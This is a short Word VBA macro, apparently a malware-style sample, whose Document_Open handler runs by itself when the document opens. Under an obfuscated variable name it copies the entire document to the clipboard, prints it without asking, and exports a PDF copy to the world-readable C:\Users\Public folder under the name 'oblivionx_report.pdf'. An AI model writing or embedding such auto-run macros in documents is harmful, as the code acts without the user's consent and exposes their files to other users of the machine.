Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim jybosg1pnivrj As Object
    Set jybosg1pnivrj = ActiveDocument.Range
    jybosg1pnivrj.Copy
    ActiveDocument.PrintOut
    ActiveDocument.ExportAsFixedFormat OutputFileName:= _
        "C:\Users\Public\oblivionx_report.pdf", ExportFormat:=wdExportFormatPDF
End Sub
